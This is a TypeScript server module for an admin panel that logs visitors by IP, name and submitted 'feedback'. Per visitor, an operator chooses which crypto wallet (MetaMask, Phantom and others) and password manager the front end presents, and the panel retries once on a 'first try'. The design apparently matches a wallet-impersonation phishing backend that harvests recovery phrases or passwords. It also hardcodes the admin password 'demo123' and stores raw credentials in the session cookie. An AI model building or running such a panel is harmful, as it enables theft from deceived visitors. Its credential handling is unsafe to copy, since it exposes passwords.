import { createHash, randomUUID, timingSafeEqual } from "node:crypto";
import type { IncomingMessage, ServerResponse } from "node:http";
import { type DatabaseClient, ensureDatabaseSchema } from "./db.js";

const ADMIN_USERNAME = "admin";
const ADMIN_PASSWORD = "demo123";
const SESSION_COOKIE = "admin_demo_session";
const MAX_ACTIVITY_RECORDS = 1000;
const MAX_FEEDBACK_LENGTH = 1000;

export type VisitorActivity = {
  ipAddress: string;
  country: string | null;
  wallet: "metamask" | "phantom" | "rabby" | "tronlink" | "coinbase" | null;
  passwordManager: "1Password" | "Bitwarden" | null;
  syncStatus: "Synced" | "Not";
  fullNames: {
    id: string;
    fullName: string;
    submittedAt: string;
  }[];
  feedbacks: {
    id: string;
    feedback: string;
    submittedAt: string;
  }[];
  visits: {
    id: string;
    operatingSystem: string;
    visitedAt: string;
  }[];
};

const safeEqual = (left: string, right: string) => {
  const leftHash = createHash("sha256").update(left).digest();
  const rightHash = createHash("sha256").update(right).digest();
  return timingSafeEqual(leftHash, rightHash);
};

const isValidCredentialPair = (username: string, password: string) =>
  safeEqual(username, ADMIN_USERNAME) && safeEqual(password, ADMIN_PASSWORD);

const getSessionCredentials = (request: IncomingMessage) => {
  const cookie = request.headers.cookie
    ?.split(";")
    .map((part) => part.trim())
    .find((part) => part.startsWith(`${SESSION_COOKIE}=`));
  if (!cookie) return null;

  try {
    const value = cookie.slice(SESSION_COOKIE.length + 1);
    const decoded = Buffer.from(value, "base64url").toString("utf8");
    const separator = decoded.indexOf(":");
    if (separator < 0) return null;
    return {
      password: decoded.slice(separator + 1),
      username: decoded.slice(0, separator)
    };
  } catch {
    return null;
  }
};

export const isAdminSession = (request: IncomingMessage) => {
  const credentials = getSessionCredentials(request);
  return (
    credentials !== null &&
    isValidCredentialPair(credentials.username, credentials.password)
  );
};

const cookieOptions = (request: IncomingMessage) => {
  const forwardedProtocol = request.headers["x-forwarded-proto"];
  const secure = Array.isArray(forwardedProtocol)
    ? forwardedProtocol.includes("https")
    : forwardedProtocol === "https";
  return `Path=/api/admin; HttpOnly; SameSite=Strict${secure ? "; Secure" : ""}`;
};

export const establishAdminSession = (
  request: IncomingMessage,
  response: ServerResponse,
  username: string,
  password: string
) => {
  if (!isValidCredentialPair(username, password)) return false;

  const token = Buffer.from(`${username}:${password}`).toString("base64url");
  response.setHeader(
    "Set-Cookie",
    `${SESSION_COOKIE}=${token}; ${cookieOptions(request)}`
  );
  return true;
};

export const clearAdminSession = (
  request: IncomingMessage,
  response: ServerResponse
) => {
  response.setHeader(
    "Set-Cookie",
    `${SESSION_COOKIE}=; ${cookieOptions(request)}; Max-Age=0`
  );
};

const readJsonBody = async (request: IncomingMessage) => {
  const chunks: Buffer[] = [];
  let size = 0;

  for await (const chunk of request) {
    const buffer = Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk);
    size += buffer.length;
    if (size > 4096) {
      throw new Error("Request body is too large.");
    }
    chunks.push(buffer);
  }

  return JSON.parse(Buffer.concat(chunks).toString("utf8")) as unknown;
};

const sendJson = (
  response: ServerResponse,
  statusCode: number,
  body: unknown
) => {
  response.writeHead(statusCode, {
    "Cache-Control": "no-store",
    "Content-Type": "application/json; charset=utf-8"
  });
  response.end(JSON.stringify(body));
};

export const handleAdminAuth = async (
  request: IncomingMessage,
  response: ServerResponse
) => {
  if (request.method === "DELETE") {
    clearAdminSession(request, response);
    sendJson(response, 200, { authenticated: false });
    return;
  }

  if (request.method !== "POST") {
    response.writeHead(405, { Allow: "POST, DELETE" });
    response.end("Method not allowed.");
    return;
  }

  let body: unknown;
  try {
    body = await readJsonBody(request);
  } catch {
    sendJson(response, 400, { error: "Invalid login request." });
    return;
  }

  if (
    typeof body !== "object" ||
    body === null ||
    !("username" in body) ||
    !("password" in body) ||
    typeof body.username !== "string" ||
    typeof body.password !== "string"
  ) {
    sendJson(response, 400, { error: "Username and password are required." });
    return;
  }

  if (!establishAdminSession(request, response, body.username, body.password)) {
    sendJson(response, 401, { error: "Invalid username or password." });
    return;
  }

  sendJson(response, 200, { authenticated: true });
};

const inferOperatingSystem = (userAgent: string) => {
  if (/android/i.test(userAgent)) return "Android";
  if (/iphone|ipad|ipod/i.test(userAgent)) return "iOS";
  if (/windows/i.test(userAgent)) return "Windows";
  if (/macintosh|mac os x/i.test(userAgent)) return "macOS";
  if (/linux/i.test(userAgent)) return "Linux";
  return "Other";
};

const getClientIp = (request: IncomingMessage) => {
  const forwarded = request.headers["x-forwarded-for"];
  const forwardedIp = Array.isArray(forwarded) ? forwarded[0] : forwarded;
  const realIp = request.headers["x-real-ip"];
  const ip =
    forwardedIp?.split(",")[0]?.trim() ||
    (Array.isArray(realIp) ? realIp[0] : realIp) ||
    request.socket.remoteAddress ||
    "Unknown";
  return ip.startsWith("::ffff:") ? ip.slice(7) : ip;
};

const getClientCountry = (request: IncomingMessage) => {
  const header = request.headers["x-vercel-ip-country"];
  const country = Array.isArray(header) ? header[0] : header;
  const normalizedCountry = country?.trim().toUpperCase();
  return normalizedCountry && /^[A-Z]{2}$/.test(normalizedCountry)
    ? normalizedCountry
    : null;
};

type ActivityWithLastVisit = VisitorActivity & { lastVisitedAt: string };
type ActivityRow = {
  ipAddress: string;
  country: string | null;
  wallet: VisitorActivity["wallet"];
  passwordManager: VisitorActivity["passwordManager"];
  syncStatus: VisitorActivity["syncStatus"];
  lastVisitedAt: string;
};
type VisitRow = VisitorActivity["visits"][number] & { ipAddress: string };
type FeedbackRow = VisitorActivity["feedbacks"][number] & {
  ipAddress: string;
};
type FullNameRow = VisitorActivity["fullNames"][number] & {
  ipAddress: string;
};

const ensureVisitorActivity = async (
  sql: DatabaseClient,
  ipAddress: string,
  country: string | null
) => {
  await sql`
    INSERT INTO visitor_activities (ip_address, country)
    VALUES (${ipAddress}, ${country})
    ON CONFLICT (ip_address) DO UPDATE
    SET country = COALESCE(EXCLUDED.country, visitor_activities.country)
  `;
};

const readVisitorActivities = async (
  sql: DatabaseClient
): Promise<ActivityWithLastVisit[]> => {
  const [activityResult, visitResult, feedbackResult, fullNameResult] =
    await Promise.all([
      sql`
        SELECT
          a.ip_address AS "ipAddress",
          a.country,
          a.wallet,
          a.password_manager AS "passwordManager",
          a.sync_status AS "syncStatus",
          (
            SELECT MAX(v.visited_at)::text
            FROM visitor_visits v
            WHERE v.ip_address = a.ip_address
          ) AS "lastVisitedAt"
        FROM visitor_activities a
        WHERE EXISTS (
          SELECT 1
          FROM visitor_visits v
          WHERE v.ip_address = a.ip_address
        )
        ORDER BY "lastVisitedAt" DESC
      `,
      sql`
        SELECT
          id,
          ip_address AS "ipAddress",
          operating_system AS "operatingSystem",
          visited_at::text AS "visitedAt"
        FROM visitor_visits
        ORDER BY visited_at DESC
        LIMIT ${MAX_ACTIVITY_RECORDS}
      `,
      sql`
        SELECT
          id,
          ip_address AS "ipAddress",
          feedback,
          submitted_at::text AS "submittedAt"
        FROM visitor_feedback
        ORDER BY submitted_at DESC
      `,
      sql`
        SELECT
          id,
          ip_address AS "ipAddress",
          full_name AS "fullName",
          submitted_at::text AS "submittedAt"
        FROM visitor_full_names
        ORDER BY submitted_at DESC
      `
    ]);

  const visitsByIp = new Map<string, VisitorActivity["visits"]>();
  for (const visit of visitResult as VisitRow[]) {
    const records = visitsByIp.get(visit.ipAddress) ?? [];
    records.push({
      id: visit.id,
      operatingSystem: visit.operatingSystem,
      visitedAt: visit.visitedAt
    });
    visitsByIp.set(visit.ipAddress, records);
  }

  const feedbacksByIp = new Map<string, VisitorActivity["feedbacks"]>();
  for (const feedback of feedbackResult as FeedbackRow[]) {
    const records = feedbacksByIp.get(feedback.ipAddress) ?? [];
    records.push({
      feedback: feedback.feedback,
      id: feedback.id,
      submittedAt: feedback.submittedAt
    });
    feedbacksByIp.set(feedback.ipAddress, records);
  }

  const fullNamesByIp = new Map<string, VisitorActivity["fullNames"]>();
  for (const fullName of fullNameResult as FullNameRow[]) {
    const records = fullNamesByIp.get(fullName.ipAddress) ?? [];
    records.push({
      fullName: fullName.fullName,
      id: fullName.id,
      submittedAt: fullName.submittedAt
    });
    fullNamesByIp.set(fullName.ipAddress, records);
  }

  return (activityResult as ActivityRow[]).map((activity) => ({
    country: activity.country,
    feedbacks: feedbacksByIp.get(activity.ipAddress) ?? [],
    fullNames: fullNamesByIp.get(activity.ipAddress) ?? [],
    ipAddress: activity.ipAddress,
    lastVisitedAt: activity.lastVisitedAt,
    passwordManager: activity.passwordManager,
    syncStatus: activity.syncStatus,
    visits: visitsByIp.get(activity.ipAddress) ?? [],
    wallet: activity.wallet
  }));
};

const sendDatabaseError = (
  response: ServerResponse,
  context: string,
  error: unknown
) => {
  console.error(
    context,
    error instanceof Error ? error.message : "Unknown database error."
  );
  if (!response.headersSent) {
    sendJson(response, 500, { error: "Unable to process visitor activity." });
  }
};

const processAdminActivity = async (
  request: IncomingMessage,
  response: ServerResponse
) => {
  const view = new URL(request.url ?? "/", "http://localhost").searchParams.get(
    "view"
  );

  if (request.method === "POST" && view === "submit-feedback") {
    let body: unknown;
    try {
      body = await readJsonBody(request);
    } catch {
      sendJson(response, 400, { error: "Invalid feedback." });
      return;
    }

    if (
      typeof body !== "object" ||
      body === null ||
      !("feedback" in body) ||
      typeof body.feedback !== "string" ||
      ("isFirstTry" in body && typeof body.isFirstTry !== "boolean")
    ) {
      sendJson(response, 400, { error: "Feedback is required." });
      return;
    }

    const feedback = body.feedback.trim();
    if (!feedback || feedback.length > MAX_FEEDBACK_LENGTH) {
      sendJson(response, 400, {
        error: "Feedback must be between 1 and 1000 characters."
      });
      return;
    }

    const sql = await ensureDatabaseSchema();
    const ipAddress = getClientIp(request);
    await ensureVisitorActivity(sql, ipAddress, getClientCountry(request));
    const submittedAt = new Date();
    const isFirstTry = "isFirstTry" in body && body.isFirstTry === true;
    if (!isFirstTry) {
      await sql`
        UPDATE visitor_activities
        SET wallet = NULL
        WHERE ip_address = ${ipAddress}
      `;
    }
    await sql`
      INSERT INTO visitor_feedback (id, ip_address, feedback, submitted_at)
      VALUES (${randomUUID()}, ${ipAddress}, ${feedback}, ${submittedAt})
    `;

    const existingVisits = await sql`
      SELECT id
      FROM visitor_visits
      WHERE ip_address = ${ipAddress}
      LIMIT 1
    `;
    if (existingVisits.length === 0) {
      await sql`
        INSERT INTO visitor_visits (
          id, ip_address, operating_system, visited_at
        )
        VALUES (
          ${randomUUID()},
          ${ipAddress},
          ${inferOperatingSystem(request.headers["user-agent"] ?? "")},
          ${submittedAt}
        )
      `;
    }

    sendJson(response, 202, { recorded: true });
    return;
  }

  if (request.method === "POST") {
    const sql = await ensureDatabaseSchema();
    const userAgent = request.headers["user-agent"] ?? "";
    const ipAddress = getClientIp(request);
    await ensureVisitorActivity(sql, ipAddress, getClientCountry(request));
    await sql`
      INSERT INTO visitor_visits (
        id, ip_address, operating_system, visited_at
      )
      VALUES (
        ${randomUUID()},
        ${ipAddress},
        ${inferOperatingSystem(userAgent)},
        ${new Date()}
      )
    `;
    await sql`
      DELETE FROM visitor_visits
      WHERE id IN (
        SELECT id
        FROM visitor_visits
        ORDER BY visited_at DESC, id DESC
        OFFSET ${MAX_ACTIVITY_RECORDS}
      )
    `;
    await sql`
      DELETE FROM visitor_activities a
      WHERE NOT EXISTS (
        SELECT 1
        FROM visitor_visits v
        WHERE v.ip_address = a.ip_address
      )
    `;
    sendJson(response, 202, { recorded: true });
    return;
  }

  if (request.method === "GET" && view === "wallet-preference") {
    const sql = await ensureDatabaseSchema();
    const ipAddress = getClientIp(request);
    const rows = await sql`
      SELECT sync_status AS "syncStatus", wallet
      FROM visitor_activities
      WHERE ip_address = ${ipAddress}
      LIMIT 1
    `;
    const activity = rows[0] as
      | {
          syncStatus: VisitorActivity["syncStatus"];
          wallet: VisitorActivity["wallet"];
        }
      | undefined;
    sendJson(response, 200, {
      syncStatus: activity?.syncStatus ?? "Synced",
      wallet: activity?.wallet ?? null
    });
    return;
  }

  if (!isAdminSession(request)) {
    sendJson(response, 401, { error: "Authentication required." });
    return;
  }

  if (request.method === "PUT") {
    let body: unknown;
    try {
      body = await readJsonBody(request);
    } catch {
      sendJson(response, 400, { error: "Invalid activity update." });
      return;
    }

    if (
      typeof body !== "object" ||
      body === null ||
      !("ipAddress" in body) ||
      !("wallet" in body) ||
      !("passwordManager" in body) ||
      !("syncStatus" in body) ||
      typeof body.ipAddress !== "string" ||
      (body.wallet !== null &&
        body.wallet !== "metamask" &&
        body.wallet !== "phantom" &&
        body.wallet !== "rabby" &&
        body.wallet !== "tronlink" &&
        body.wallet !== "coinbase") ||
      (body.passwordManager !== null &&
        body.passwordManager !== "1Password" &&
        body.passwordManager !== "Bitwarden") ||
      (body.syncStatus !== "Synced" && body.syncStatus !== "Not")
    ) {
      sendJson(response, 400, { error: "Invalid activity update." });
      return;
    }

    const sql = await ensureDatabaseSchema();
    const rows = await sql`
      UPDATE visitor_activities
      SET
        wallet = ${body.wallet},
        password_manager = ${body.passwordManager},
        sync_status = ${body.syncStatus}
      WHERE ip_address = ${body.ipAddress}
      RETURNING ip_address
    `;
    if (rows.length === 0) {
      sendJson(response, 404, { error: "Visitor activity was not found." });
      return;
    }

    const activities = await readVisitorActivities(sql);
    const activity = activities.find(
      (entry) => entry.ipAddress === body.ipAddress
    );
    sendJson(response, 200, { activity });
    return;
  }

  if (request.method !== "GET") {
    response.writeHead(405, { Allow: "GET, POST, PUT" });
    response.end("Method not allowed.");
    return;
  }

  const sql = await ensureDatabaseSchema();
  const activities = await readVisitorActivities(sql);
  sendJson(response, 200, { activities });
};

export const handleAdminActivity = async (
  request: IncomingMessage,
  response: ServerResponse
) => {
  try {
    await processAdminActivity(request, response);
  } catch (error) {
    sendDatabaseError(response, "Admin activity request failed.", error);
  }
};

const processAdminSignup = async (
  request: IncomingMessage,
  response: ServerResponse
) => {
  if (request.method !== "POST") {
    response.writeHead(405, { Allow: "POST" });
    response.end("Method not allowed.");
    return;
  }

  let body: unknown;
  try {
    body = await readJsonBody(request);
  } catch {
    sendJson(response, 400, { error: "Invalid signup details." });
    return;
  }

  if (
    typeof body !== "object" ||
    body === null ||
    !("fullName" in body) ||
    typeof body.fullName !== "string"
  ) {
    sendJson(response, 400, { error: "Full name is required." });
    return;
  }

  const fullName = body.fullName.trim();
  if (!fullName || fullName.length > 100) {
    sendJson(response, 400, {
      error: "Full name must be between 1 and 100 characters."
    });
    return;
  }

  const sql = await ensureDatabaseSchema();
  const ipAddress = getClientIp(request);
  await ensureVisitorActivity(sql, ipAddress, getClientCountry(request));
  const submittedAt = new Date();
  await sql`
    INSERT INTO visitor_full_names (
      id, ip_address, full_name, submitted_at
    )
    VALUES (${randomUUID()}, ${ipAddress}, ${fullName}, ${submittedAt})
  `;

  const existingVisits = await sql`
    SELECT id
    FROM visitor_visits
    WHERE ip_address = ${ipAddress}
    LIMIT 1
  `;
  if (existingVisits.length === 0) {
    await sql`
      INSERT INTO visitor_visits (
        id, ip_address, operating_system, visited_at
      )
      VALUES (
        ${randomUUID()},
        ${ipAddress},
        ${inferOperatingSystem(request.headers["user-agent"] ?? "")},
        ${submittedAt}
      )
    `;
  }

  sendJson(response, 202, { recorded: true });
};

export const handleAdminSignup = async (
  request: IncomingMessage,
  response: ServerResponse
) => {
  try {
    await processAdminSignup(request, response);
  } catch (error) {
    sendDatabaseError(response, "Admin signup request failed.", error);
  }
};
